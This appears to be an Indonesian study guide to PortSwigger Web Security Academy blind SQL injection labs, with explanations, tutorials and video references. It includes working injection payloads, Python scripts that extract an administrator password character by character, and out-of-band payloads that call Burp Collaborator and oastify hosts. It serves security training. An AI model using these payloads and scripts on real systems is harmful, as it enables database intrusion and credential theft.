Beberapa aplikasi menjalankan kueri SQL tapi perilakunya tidak berubah, apa pun apakah kueri mengembalikan data. Teknik di bagian sebelumnya tidak bakal kerja, karena menyuntikkan kondisi boolean berbeda tidak bikin perbedaan di respons aplikasi.

Sering memungkinkan untuk menginduksi aplikasi mengembalikan respons berbeda tergantung apakah error SQL terjadi. Anda bisa modifikasi kueri supaya menyebabkan error basis data hanya jika kondisi true. Sering, error yang tidak tertangani yang dilempar basis data menyebabkan perbedaan di respons aplikasi, seperti pesan error. Ini memungkinkan Anda menyimpulkan kebenaran kondisi yang disuntikkan.

#### Mengeksploitasi Blind SQL Injection dengan Memicu Error Kondisional - Lanjutan

Untuk lihat cara kerja, asumsikan dua request dikirim berisi nilai cookie `TrackingId` berikut secara bergantian:

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Input ini pakai kata kunci `CASE` untuk uji kondisi dan kembalikan ekspresi berbeda tergantung apakah ekspresi true:

- Dengan input pertama, ekspresi `CASE` evaluasi ke `'a'`, yang tidak menyebabkan error.
- Dengan input kedua, evaluasi ke `1/0`, yang menyebabkan error divide-by-zero.

Kalau error menyebabkan perbedaan di respons HTTP aplikasi, Anda bisa pakai ini untuk menentukan apakah kondisi yang disuntikkan true.

Pakai teknik ini, Anda bisa ambil data dengan uji satu karakter per satu waktu:

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1,1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

> **Catatan:** Ada cara berbeda memicu error kondisional, dan teknik berbeda bekerja terbaik di tipe basis data berbeda. Untuk detail lebih lanjut, lihat SQL injection cheat sheet.

##### Lab: Blind SQL Injection dengan Error Kondisional

Lab ini berisi kerentanan blind SQL injection. Aplikasi pakai cookie tracking untuk analitik, dan menjalankan kueri SQL yang berisi nilai cookie yang dikirimkan.

<details>
<summary>Detail Lab, Screenshot & Walkthrough 0.10</summary>

Hasil kueri SQL tidak dikembalikan, dan aplikasi tidak merespons berbeda berdasarkan apakah kueri mengembalikan baris manapun, jika kueri SQL menyebabkan error, maka aplikasi mengembalikan pesan error custom.

Basis data berisi tabel berbeda bernama `users`, dengan kolom bernama `username` dan `password`. Anda perlu mengeksploitasi kerentanan blind SQL injection untuk mengetahui password user `administrator`.

Untuk menyelesaikan lab, login sebagai user `administrator`.

> **Catatan:** Lab ini pakai database Oracle. Untuk info lebih lanjut, lihat [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

![Akses Lab 0.10](images/lab-0.10-blind-conditional-errors/01-access-lab-0.10.png)

![Buka Halaman 0.10](images/lab-0.10-blind-conditional-errors/02-open-pages-0.10.png)

![Aktifkan Proxy 0.10](images/lab-0.10-blind-conditional-errors/03-activate-proxy-0.10.png)

![Cek History dan Kirim ke Repeater 0.10](images/lab-0.10-blind-conditional-errors/04-send-request-to-repeater-0.10.png)

![Uji SQL Injection dengan Single Quote 0.10](images/lab-0.10-blind-conditional-errors/05-test-single-quote-0.10.png)

![Uji Sintaks Komentar SQL 0.10](images/lab-0.10-blind-conditional-errors/06-test-sql-comment-0.10.png)

![Uji Kondisi TRUE 0.10](images/lab-0.10-blind-conditional-errors/07-test-true-condition-0.10.png)

![Uji Kondisi FALSE 0.10](images/lab-0.10-blind-conditional-errors/08-test-false-condition-0.10.png)

![Panjang Password Lebih dari 1 0.10](images/lab-0.10-blind-conditional-errors/09-password-length-greater-than-1-0.10.png)

![Panjang Password Lebih dari 100 0.10](images/lab-0.10-blind-conditional-errors/10-password-length-greater-than-100-0.10.png)

![Hasil Enumerasi Panjang Password 0.10](images/lab-0.10-blind-conditional-errors/11-password-length-result-0.10.png)

![Script Enumerasi Panjang Password 0.10](images/lab-0.10-blind-conditional-errors/12-password-length-enumeration-script-0.10.png)

![Uji Password dengan SUBSTR 0.10](images/lab-0.10-blind-conditional-errors/13-test-substring-password-0.10.png)

![Script Enumerasi Karakter Password 0.10](images/lab-0.10-blind-conditional-errors/14-password-character-enumeration-script-0.10.png)

![Password Administrator Diekstrak 0.10](images/lab-0.10-blind-conditional-errors/15-administrator-password-extracted-0.10.png)

![Login Administrator 0.10](images/lab-0.10-blind-conditional-errors/16-administrator-login-0.10.png)

![Login Sukses 0.10](images/lab-0.10-blind-conditional-errors/17-login-success-0.10.png)

##### Tutorial

1. Akses website target, sadap permintaan HTTP, dan kirim ke Burp Suite Repeater.

2. Masukkan single quote (`'`) ke cookie `TrackingId` untuk cek respons server dan identifikasi kemungkinan error SQL. Lalu coba tambah komentar SQL (`--`) untuk pulihkan respons normal.

```sql
Cookie: TrackingId=cf0TIM6uE9oXtwj5'
Cookie: TrackingId=cf0TIM6uE9oXtwj5'--
```

3. Uji perilaku error kondisional pakai `CASE` dan `TO_CHAR` untuk tentukan kondisi TRUE dan FALSE.

```sql
Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--

Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--
```

Respons yang diharapkan:

- `1=2`: HTTP 200 (respons normal).
- `1=1`: HTTP 500 (error kondisional).

4. Uji user target di tabel `users` dan cek panjang password administrator pakai `LENGTH()`.

```sql
Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN LENGTH(password) > 1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--

Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN LENGTH(password) > 100 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
```

Perilaku yang diharapkan:

- `LENGTH(password) > 1`: HTTP 500 kalau password lebih panjang dari 1 karakter.
- `LENGTH(password) > 100`: HTTP 200 kalau password 100 karakter atau kurang.

Untuk testing manual, sempitkan panjang password:

```sql
Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN LENGTH(password) > 19 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--

Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN LENGTH(password) > 20 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
```

Kalau `>19` balik HTTP 500 dan `>20` balik HTTP 200, panjang password 20 karakter.

5. Otomatisasi deteksi panjang password pakai script Python.

```python
import requests

# Set URL target
url = "https://0aef008f04667a9c83ee831e004800e8.web-security-academy.net/"

# Definisikan cookie session
tracking_id = "cf0TIM6uE9oXtwj5"
session = "CN3T8AJ1GDQhTbXSNaVdhu020gESmoic"

# Deteksi panjang password
for length in range(1, 31):

    # Suntikkan error kondisional ke TrackingId
    cookies = {
        "TrackingId": f"{tracking_id}' AND (SELECT CASE WHEN LENGTH(password) > {length} THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--",
        "session": session
    }

    # Kirim permintaan dan cek respons HTTP
    response = requests.get(url, cookies=cookies)

    # HTTP 500 menandakan kondisi TRUE
    if response.status_code == 500:
        print(f"[+] Panjang > {length}: TRUE")

    # HTTP 200 menandakan kondisi FALSE
    else:
        print(f"[+] Panjang password: {length}")
        break
```

6. Setelah identifikasi panjang password, pakai `SUBSTR()` untuk uji karakter password individual. Coba karakter alphanumeric (`A-Z`, `a-z`, `0-9`).

```sql
Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN SUBSTR(password, 1, 1) = 'a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--

Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN SUBSTR(password, 1, 1) = '8' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
```

Perilaku yang diharapkan:

- Karakter `a`: HTTP 200 kalau tidak cocok.
- Karakter `8`: HTTP 500 kalau cocok.

7. Otomatisasi enumerasi karakter password pakai script Python.

```python
import requests
import string

# Set URL target
url = "https://0aef008f04667a9c83ee831e004800e8.web-security-academy.net/"

# Definisikan cookie session
tracking_id = "cf0TIM6uE9oXtwj5"
session = "CN3T8AJ1GDQhTbXSNaVdhu020gESmoic"

# Definisikan karakter password yang mungkin
chars = string.ascii_letters + string.digits
password = ""

# Ekstrak password karakter per karakter
for position in range(1, 21):
    for char in chars:

        # Suntikkan kondisi SUBSTR ke TrackingId
        cookies = {
            "TrackingId": f"{tracking_id}' AND (SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--",
            "session": session
        }

        # Kirim permintaan dan cek respons HTTP
        response = requests.get(url, cookies=cookies)

        # HTTP 500 menandakan karakter cocok
        if response.status_code == 500:
            password += char
            print(f"[+] {position}: {char} -> {password}")
            break

# Cetak password yang diekstrak
print(f"\nPassword: {password}")
```

8. Jalankan script Python untuk ekstraksi password karakter per karakter. Script menguji semua 20 posisi dan identifikasi karakter cocok lewat respons HTTP 500.

9. Login pakai kredensial yang diekstrak:

- Username: `administrator`
- Password: password yang diekstrak

10. Verifikasi autentikasi sukses. Lab seharusnya sekarang ditandai solved.

##### Referensi

<details>
<summary> 26. Blind SQL Injection With Conditional Errors - Administrator Password Stolen — z3nshell</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=HjXUtCKm1FM
Tujuan: Dalam tutorial ini kita demonstrasikan serangan blind SQL injection pakai 'conditional errors'. Di mana kita memaksa server SQL bocorkan info dengan memaksa error saat kueri SQL cocok.
</details>

<details>
<summary>27. SQL Injection - Lab #12 - Blind SQL injection with conditional errors — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=_7w-KEP_K5w
Tujuan: Dalam video ini, kita bahas Lab #12 di trek SQL injection Web Security Academy. Lab ini berisi kerentanan blind SQL injection. Untuk menyelesaikan lab, kita melakukan serangan blind based SQL injection pada basis data yang mengambil password user administrator di aplikasi.
</details>

<details>
<summary>28. Blind SQL injection with conditional errors (Video solution, Audio) — Michael Sommer</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=HbaD3maRucc
Tujuan: Video ini menunjukkan solusi lab "Blind SQL injection with conditional errors" dari Web Security Academy (Portswigger)
</details>

</details>

#### Mengambil Data Sensitif lewat Pesan Error SQL Verbose

Misconfigurasi basis data kadang menghasilkan pesan error verbose. Ini bisa memberikan info yang berguna buat penyerang. Misalnya, pertimbangkan pesan error berikut, yang terjadi setelah menyuntikkan single quote ke parameter `id`.

```sql
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

Ini menampilkan kueri penuh yang dibangun aplikasi pakai input kita. Kita bisa lihat kalau di sini kita menyuntikkan ke string single-quote di dalam statement `WHERE`. Ini memudahkan konstruksi kueri valid yang berisi payload berbahaya.

Mengomentari sisa kueri akan mencegah single-quote berlebihan merusak sintaks.

#### Mengambil Data Sensitif lewat Pesan Error SQL Verbose - Lanjutan

Kadang, Anda mungkin bisa menginduksi aplikasi generate pesan error yang berisi beberapa data yang dikembalikan kueri. Ini efektif mengubah kerentanan blind SQL injection yang lain jadi terlihat.

Anda bisa pakai fungsi `CAST()` untuk mencapai ini. Fungsi ini memungkinkan konversi satu tipe data ke tipe lain. Misalnya, bayangkan kueri yang berisi statement berikut:

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

Sering, data yang mau Anda baca adalah string. Mencoba konversi ke tipe data tidak kompatibel, seperti `int`, mungkin menyebabkan error mirip berikut:

```sql
ERROR: invalid input syntax for type integer: "Example data"
```

Jenis kueri ini juga berguna kalau batas karakter mencegah Anda memicu respons kondisional.

##### Lab: Visible Error-based SQL Injection

Lab ini berisi kerentanan SQL injection. Aplikasi pakai cookie tracking untuk analitik, dan menjalankan kueri SQL yang berisi nilai cookie yang dikirimkan. Hasil kueri SQL tidak dikembalikan.

<details>
<summary>Detail Lab, Screenshot & Walkthrough 0.11</summary>

![Akses Lab 0.11](images/lab-0.11-visible-error-based/01-access-lab-0.11.png)

![Buka HTTP History dan Kirim ke Repeater 0.11](images/lab-0.11-visible-error-based/02-send-to-repeater-0.11.png)

![Input Single Quote 0.11](images/lab-0.11-visible-error-based/03-single-quote-0.11.png)

![Input SQL Comments 0.11](images/lab-0.11-visible-error-based/04-sql-comments-0.11.png)

![Input CAST SELECT as Integer dan Dapat Respons False 0.11](images/lab-0.11-visible-error-based/05-cast-integer-false-0.11.png)

![Input Perbandingan dengan 1 dan Dapat Respons True 0.11](images/lab-0.11-visible-error-based/06-cast-integer-true-0.11.png)

![Bersihkan Cookie dan Coba Lagi Kueri Basis Data 0.11](images/lab-0.11-visible-error-based/10-clear-cookie-retry-0.11.png)

![Bersihkan Cookie dan Ekstrak Username Administrator 0.11](images/lab-0.11-visible-error-based/07-extract-username-0.11.png)

![Tambah LIMIT 1 untuk Ambil Username Administrator 0.11](images/lab-0.11-visible-error-based/08-limit-one-username-0.11.png)

![Ekstrak Password Administrator Lewat Error CAST 0.11](images/lab-0.11-visible-error-based/09-extract-password-0.11.png)

![Login Pakai Kredensial Administrator 0.11](images/lab-0.11-visible-error-based/11-administrator-login-0.11.png)

![Login Sukses dan Verifikasi Lab Solved 0.11](images/lab-0.11-visible-error-based/12-lab-solved-0.11.png)


##### Tutorial

1. Buka Burp Suite dan navigasi ke **Proxy → HTTP history**.
2. Temukan permintaan yang berisi cookie `TrackingId`. Klik kanan permintaan dan pilih **Send to Repeater**.
3. Di Repeater, tambahkan single quote (`'`) ke nilai `TrackingId` untuk uji apakah parameter rentan SQL injection.
```sql
'
```
4. Tambahkan `'--` untuk tutup string existing dan komentar sisa statement SQL.
```sql
'--
```
5. Uji error-based SQL injection pakai `CAST()`.
```sql
' AND CAST((SELECT 1) AS int)--
```
6. Modifikasi kondisi untuk bandingkan hasil dengan `1`, karena operator `AND` butuh ekspresi boolean.
```sql
' AND 1=CAST((SELECT 1) AS int)--
```
7. Ambil username dari tabel `users` pakai subquery.
```sql
' AND 1=CAST((SELECT username FROM users) AS int)--
```
8. Tambah `LIMIT 1` untuk memastikan subquery hanya balik satu baris.
```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
9. Ambil password pakai teknik `CAST()` yang sama.
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
10. Pakai username dan password yang diekstrak untuk autentikasi sebagai `administrator`.
11. Verifikasi lab PortSwigger menampilkan **Solved**.

##### Referensi

<details>
<summary>29. SQL Injection - Lab #18 Visible error-based SQL injection | Short Version — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=sAZV4z9rOVE
Tujuan: Dalam video ini, kita bahas Lab #18 di modul SQL injection Web Security Academy. Lab ini berisi kerentanan SQL injection. Aplikasi pakai cookie tracking untuk analitik, dan menjalankan kueri SQL yang berisi nilai cookie yang dikirimkan. Hasil kueri SQL tidak dikembalikan.
</details>

</details>

#### Mengeksploitasi Blind SQL Injection dengan Memicu Time Delay

Kalau aplikasi menangkap error basis data saat kueri SQL dieksekusi dan handle dengan graceful, tidak akan ada perbedaan di respons aplikasi. Artinya teknik sebelumnya untuk induksi error kondisional tidak bakal kerja.

Dalam situasi ini, sering memungkinkan mengeksploitasi kerentanan blind SQL injection dengan memicu time delay tergantung apakah kondisi yang disuntikkan true atau false. Karena kueri SQL biasanya diproses synchronous oleh aplikasi, menunda eksekusi kueri SQL juga menunda respons HTTP. Ini memungkinkan Anda menentukan kebenaran kondisi yang disuntikkan berdasarkan waktu yang dibutuhkan terima respons HTTP.

#### Mengeksploitasi Blind SQL Injection dengan Memicu Time Delay - Lanjutan

Teknik untuk memicu time delay spesifik ke tipe basis data yang dipakai. Misalnya, di Microsoft SQL Server, Anda bisa pakai berikut untuk uji kondisi dan memicu delay tergantung apakah ekspresi true:

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```
- Input pertama tidak memicu delay, karena kondisi `1=2` false.
- Input kedua memicu delay 10 detik, karena kondisi `1=1` true.

Pakai teknik ini, kita bisa ambil data dengan uji satu karakter per satu waktu:

```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1,1) > 'm') = 1 WAITFOR DELAY '0:0{delay}'--
```

> **Catatan:** Ada berbagai cara memicu time delay dalam kueri SQL, dan teknik berbeda berlaku di tipe basis data berbeda. Untuk detail lebih lanjut, lihat [SQL injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

##### Lab: Blind SQL Injection dengan Time Delay dan Pengambilan Informasi

Lab ini berisi kerentanan blind SQL injection. Aplikasi pakai cookie tracking untuk analitik, dan menjalankan kueri SQL yang berisi nilai cookie yang dikirimkan.

<details>
<summary>Detail Lab, Screenshot & Walkthrough 0.12</summary>

Hasil kueri SQL tidak dikembalikan, dan aplikasi tidak merespons berbeda berdasarkan apakah kueri mengembalikan baris manapun atau menyebabkan error. Namun, karena kueri dieksekusi synchronous, memungkinkan memicu time delay kondisional untuk menyimpulkan informasi.

Basis data berisi tabel berbeda `users`, dengan kolom bernama `username` dan `password`. Anda perlu mengeksploitasi kerentanan blind SQL Injection untuk mengetahui password user `administrator`.

> **Catatan:** Anda bisa menemukan beberapa payload berguna di [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

![Akses lab 0.12 - Blind Time-Based SQL Injection](images/lab-0.12-blind-time-delays/access-lab-0.12.png)

![Kirim request ke Repeater untuk test cookie TrackingId 0.12](images/lab-0.12-blind-time-delays/capture-request-repeater-0.12.png)

![Suntikkan pg_sleep(10) dan amati delay respons 10 detik 0.12](images/lab-0.12-blind-time-delays/test-pg-sleep-time-delay-0.12.png)

![Uji kondisi FALSE (1=2) dan amati waktu respons normal 0.12](images/lab-0.12-blind-time-delays/test-false-condition-0.12.png)

![Uji kondisi TRUE (1=1) dan amati delay respons 10 detik 0.12](images/lab-0.12-blind-time-delays/test-true-condition-0.12.png)

![Verifikasi tabel users pakai time delay kondisional 0.12](images/lab-0.12-blind-time-delays/identify-users-table-0.12.png)

![Uji username zeroday dan amati tidak ada time delay karena user tidak ada 0.12](images/lab-0.12-blind-time-delays/verify-zeroday-username-0.12.png)

![Uji username administrator dan konfirmasi time delay karena user ada 0.12](images/lab-0.12-blind-time-delays/verify-administrator-username-0.12.png)

![Uji panjang password 1 dan amati waktu respons normal 0.12](images/lab-0.12-blind-time-delays/test-password-length-1-0.12.png)

![Uji panjang password 10 dan amati waktu respons normal 0.12](images/lab-0.12-blind-time-delays/test-password-length-10-0.12.png)

![Konfirmasi panjang password 20 lewat delay respons 10 detik 0.12](images/lab-0.12-blind-time-delays/confirm-password-length-20-0.12.png)

![Uji karakter pertama password pakai SUBSTRING() dan time delay kondisional 0.12](images/lab-0.12-blind-time-delays/test-password-character-0.12.png)

![Jalankan otomatisasi Python dan ekstrak password administrator karakter per karakter pakai deteksi time-based 0.12](images/lab-0.12-blind-time-delays/extract-password-python-0.12.png)

![Buka halaman login administrator setelah ekstraksi password 0.12](images/lab-0.12-blind-time-delays/administrator-login-page-0.12.png)

![Berhasil autentikasi sebagai administrator dan selesaikan lab 0.12](images/lab-0.12-blind-time-delays/lab-completed-0.12.png)

##### Tutorial

1. Buka halaman `/`, tangkap request di HTTP history, dan kirim ke Repeater.
2. Uji parameter cookie `TrackingId` pakai `pg_sleep()`:
```sql
'|| (SELECT pg_sleep(10))||'
```
Respons memakan sekitar 10 detik (mis. 10.191 detik), menandakan potensi kerentanan SQL injection time-based.

3. Uji statement kondisional (TRUE/FALSE) untuk memahami perilaku respons dan identifikasi struktur basis data.

```sql
'||CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END-- 
# False: respons normal (~184 ms)

'||CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- 
# True: respons delay (~20.183 detik)

'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)-- 
# Verifikasi tabel users ada.

'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='zeroday')-- 
# Cek apakah username zeroday ada.

'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- 
# Verifikasi username administrator ada.

'||(SELECT CASE WHEN LENGTH(password) = 1 THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- 
# Uji apakah panjang password 1.

'||(SELECT CASE WHEN LENGTH(password) = 10 THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- 
# Uji apakah panjang password 10.

'||(SELECT CASE WHEN LENGTH(password) = 20 THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- 
# Uji apakah panjang password 20. Respons delay menandakan match.

'||(SELECT CASE WHEN SUBSTRING(password, 1, 1) = '0' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- 
# Uji apakah karakter pertama password '0'.
```
4. Otomatisasi ekstraksi password pakai script Python:

```python
import requests
import string
import time

# Target dan session
url = "https://0a7800c3041616da80c6216900aa0033.web-security-academy.net/"
tracking_id = "UUHgnp4idxP5HXuZ"
session = "lxguDCkoOTdbg9IixxExVJvwgCUFEWhH"

# Pengaturan ekstraksi
delay = 10
threshold = 9.5
max_length = 50

chars = string.ascii_lowercase + string.digits

http = requests.Session()
http.headers["User-Agent"] = "Mozilla/5.0"

password = ""

print("[*] Time-Based Blind SQLi")
print("[*] Mengekstrak password administrator...\n")

# Ekstrak password karakter per karakter
for pos in range(1, max_length + 1):
    for char in chars:

        # Uji karakter password pakai pg_sleep()
        cookies = {
            "TrackingId": (
                f"{tracking_id}'||(SELECT CASE WHEN "
                f"SUBSTRING(password,{pos},1)='{char}' "
                f"THEN pg_sleep({delay}) ELSE pg_sleep(0) END "
                "FROM users WHERE username='administrator')--"
            ),
            "session": session
        }

        try:
            start = time.perf_counter()
            http.get(url, cookies=cookies, timeout=delay + 10)
            elapsed = time.perf_counter() - start

            if elapsed >= threshold:
                password += char
                print(
                    f"[+] {pos:02}: {char} | "
                    f"{elapsed:.2f} detik"
                )
                break

        except requests.RequestException:
            continue
    else:
        print(f"\n[!] Ekstraksi berhenti di posisi {pos}.")
        break

print(f"\n[+] Password: {password}")
```
5. Jalankan script dan tunggu proses ekstraksi selesai.
6. Cek output terminal untuk dapatkan password yang diekstrak.
7. Buka halaman login dan masukkan username `administrator` dengan password yang diekstrak.
8. Berhasil login sebagai administrator dan selesaikan lab.

##### Referensi

<details>
<summary>30. SQL Injection - Lab #18 Visible error-based SQL injection | Short Version — Intigriti</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=xHzH00vyVHA
Tujuan: Dalam video ini, kita akan melihat cara mengambil data dari database PostgreSQL dengan memantau DB sleeps pakai fungsi pg_sleep(). 
</details>

<details>
<summary>31. SQL Injection - Lab #14 Blind SQL injection with time delays and information retrieval — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=L2e6wrNj4BA
Tujuan: Dalam video ini, kita bahas Lab #14 di trek SQL injection Web Security Academy. Lab ini berisi kerentanan blind SQL injection. Untuk menyelesaikan lab, kita mengeksploitasi kerentanan SQL injection time-based dan output password user administrator.
</details>

<details>
<summary>32. Blind SQL injection with time delays and information retrieval  — Michael Sommer</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=ogljCf4oR3E
Tujuan: Blind SQL injection with time delays and information retrieval
</details>

</details>

#### Mengeksploitasi Blind SQL Injection pakai Teknik Out-of-Band (OAST)

Aplikasi mungkin menjalankan kueri SQL yang sama seperti contoh sebelumnya tapi melakukannya asynchronous. Aplikasi lanjut memproses request user di thread asli. Kueri tetap rentan SQL Injection, tapi tidak ada teknik yang dijelaskan sejauh ini yang akan kerja. Respons aplikasi tidak bergantung pada kueri mengembalikan data, error basis data terjadi, atau waktu eksekusi kueri.

Dalam situasi ini, sering memungkinkan mengeksploitasi kerentanan blind SQL Injection dengan memicu interaksi jaringan out-of-band ke sistem yang Anda kontrol. Ini bisa dipicu berdasarkan kondisi yang disuntikkan untuk menyimpulkan info satu potong per satu waktu. Lebih berguna, data bisa diekfiltrasi langsung dalam interaksi jaringan.

Berbagai protokol jaringan bisa dipakai untuk tujuan ini, tapi biasanya paling efektif adalah DNS (domain name service). Banyak jaringan produksi mengizinkan egress bebas query DNS, karena mereka essential untuk operasi normal sistem produksi.

#### Mengeksploitasi Blind SQL Injection pakai Teknik Out-of-Band (OAST) - Lanjutan

Tool paling mudah dan andal untuk teknik out-of-band adalah Burp Collaborator. Ini server yang menyediakan implementasi custom berbagai layanan jaringan, termasuk DNS. Dia memungkinkan Anda deteksi kapan interaksi jaringan terjadi akibat mengirim payload individual ke aplikasi rentan. Burp Suite Professional menyertakan built-in client yang dikonfigurasi kerja dengan Burp Collaborator.

Teknik untuk memicu query DNS spesifik ke tipe basis data yang dipakai. Misalnya, input berikut di Microsoft SQL Server bisa dipakai untuk menyebabkan DNS lookup di domain tertentu:

```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

Ini menyebabkan basis data melakukan lookup untuk domain berikut:
```sql
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

Anda bisa pakai Burp Collaborator untuk generate subdomain unik dan polling server Collaborator untuk konfirmasi kapan DNS lookup terjadi.

##### Lab: Blind SQL Injection dengan Interaksi Out-of-Band

Lab ini berisi kerentanan blind SQL injection. Aplikasi pakai cookie tracking untuk analitik, dan menjalankan kueri SQL yang berisi nilai cookie yang dikirimkan.

<details>
<summary>Detail Lab, Screenshot & Walkthrough 0.13</summary>

Kueri SQL dieksekusi asynchronous dan tidak punya efek ke respons aplikasi. Namun, Anda bisa memicu interaksi out-of-band dengan domain eksternal.

Untuk menyelesaikan lab, eksploitasi kerentanan SQL injection untuk menyebabkan DNS lookup ke Burp Collaborator.

> **Catatan:** Untuk mencegah platform Academy dipakai menyerang pihak ketiga, firewall kami blokir interaksi antara lab dan sistem eksternal sembarangan. Untuk menyelesaikan lab, Anda harus pakai server public default Burp Collaborator.

> Anda bisa temukan beberapa payload berguna di SQL injection cheat sheet[https://portswigger.net/web-security/sql-injection/cheat-sheet].


##### Tutorial

1. Segera saya coba selesaikan, kenapa? karena butuh Burp Professional untuk coba fitur Burp collaborator.
2. Untuk mencegah platform Academy dipakai menyerang pihak ketiga, firewall kami blokir interaksi antara lab dan sistem eksternal sembarangan. Untuk menyelesaikan lab, Anda harus pakai server public default Burp Collaborator.

```sql
TrackingId=KyKt0Ao9NASbbhfa'|| SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://5rxfp0q79vqepdtouy5s69ciz950trhg.oastify.com"> %remote;]>'),'/l') FROM dual)--
```

##### Referensi

<details>
<summary>33. SQL Injection - Lab #15 Blind SQL injection with out-of-band interaction — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=-t4cr5uRzzA
Tujuan: Lab ini berisi kerentanan blind SQL injection. Untuk menyelesaikan lab, kita mengeksploitasi kerentanan SQL injection untuk menyebabkan DNS lookup ke Burp Collaborator.
</details>

<details>
<summary>34. Blind SQL injection with out-of-band interaction — Michael Sommer</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=dP4fGg11whc
Tujuan: Blind SQL injection with out-of-band interaction
</details>

</details>

##### Lab: Blind SQL Injection dengan Ekfiltrasi Data Out-of-Band

Lab ini berisi kerentanan blind SQL Injection. Aplikasi pakai cookie tracking untuk analitik, dan menjalankan kueri SQL yang berisi nilai cookie yang dikirimkan.

Kueri SQL dieksekusi asynchronous dan tidak punya efek ke respons aplikasi. Namun, Anda bisa memicu interaksi out-of-band dengan domain eksternal.

<details>
<summary>Detail Lab, Screenshot & Walkthrough 0.14</summary>

Basis data berisi tabel berbeda bernama `users`, dengan kolom bernama `username` dan `password`. Anda perlu mengeksploitasi kerentanan blind SQL Injection untuk mengetahui password user `administrator`.

Untuk menyelesaikan lab, login sebagai user `administrator`.

> **Catatan:** Untuk mencegah platform Academy dipakai menyerang pihak ketiga, firewall kami blokir interaksi antara lab dan sistem eksternal sembarangan. Untuk menyelesaikan lab, Anda harus pakai server public default Burp Collaborator.

##### Referensi

<details>
<summary>35. SQL Injection - Lab #16 Blind SQL injection with out of band data exfiltration — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=KOaDan0UqFs
Tujuan: Lab ini berisi kerentanan blind SQL injection. Untuk menyelesaikan lab, kita mengeksploitasi kerentanan SQL injection out-of-band untuk output password administrator.
</details>

<details>
<summary>36. Blind SQL injection with out-of-band data exfiltration — Michael Sommer</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=-ReGzKgrOd4
Tujuan: Video ini menunjukkan solusi lab "Blind SQL injection with out-of-band data exfiltration" dari Web Security Academy (Portswigger)
</details>

</details>

## SQL Injection di Konteks Berbeda

Di lab sebelumnya, Anda butuh query string untuk menyuntikkan payload SQL berbahaya. Namun, Anda bisa melakukan serangan SQL Injection pakai input kontrol apa pun yang diproses sebagai kueri SQL oleh aplikasi. Misalnya, beberapa website ambil input dalam format JSON atau XML dan pakai ini untuk kueri basis data.

